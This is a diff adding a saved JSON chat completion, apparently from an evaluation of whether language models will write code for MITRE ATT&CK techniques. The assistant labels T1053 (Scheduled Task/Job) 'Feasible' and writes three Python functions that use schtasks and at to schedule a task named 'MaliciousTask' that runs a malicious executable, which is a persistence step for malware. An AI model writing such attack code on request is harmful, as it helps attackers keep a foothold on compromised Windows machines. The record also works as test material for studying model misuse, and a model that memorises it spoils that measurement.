@@ -1,0 +1,22 @@
+{
+  "id":"chatcmpl-8R2z4ROdMLC1hiK4OFOPyCjhmzTYz",
+  "object":"chat.completion",
+  "created":1701457018,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[Feasible]\nT1053 - Scheduled Task/Job\n\nAttempt 1:\nPackages used: subprocess\n\ndef create_scheduled_task(task_name, command, arguments, schedule_time):\n    try:\n        subprocess.run(['schtasks', '/create', '/tn', task_name, '/tr', command, '/sc', 'ONCE', '/st', schedule_time, '/f'])\n        print(\"Scheduled task created successfully.\")\n    except Exception as e:\n        print(\"Failed to create scheduled task:\", str(e))\n\ncreate_scheduled_task(\"MaliciousTask\", \"C:\\\\path\\\\to\\\\malicious\\\\file.exe\", \"\", \"16:30\")\n\nAttempt 2:\nPackages used: subprocess\n\ndef create_scheduled_task(task_name, command, arguments, schedule_time):\n    try:\n        subprocess.run(['at', schedule_time, '/interactive', '/every:Monday', '/next:'+schedule_time, '/command', command])\n        print(\"Scheduled task created successfully.\")\n    except Exception as e:\n        print(\"Failed to create scheduled task:\", str(e))\n        \ncreate_scheduled_task(\"MaliciousTask\", \"C:\\\\path\\\\to\\\\malicious\\\\file.exe\", \"\", \"16:30\")\n\nAttempt 3:\nPackages used: subprocess\n\ndef create_scheduled_task(task_name, command, arguments, schedule_time):\n    try:\n        subprocess.run(['schtasks', '/create', '/tn', task_name, '/tr', command, '/sc', 'DAILY', '/st', schedule_time, '/f'])\n        print(\"Scheduled task created successfully.\")\n    except Exception as e:\n        print(\"Failed to create scheduled task:\", str(e))\n\ncreate_scheduled_task(\"MaliciousTask\", \"C:\\\\path\\\\to\\\\malicious\\\\file.exe\", \"\", \"16:30\")\n\nThe following functions take in the task name, command to be executed, arguments (if any), and the desired schedule time. The task will be created using the appropriate system utility for scheduling tasks."
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":862,
+    "completion_tokens":401,
+    "total_tokens":1263
+  },
+  "system_fingerprint":null
+}
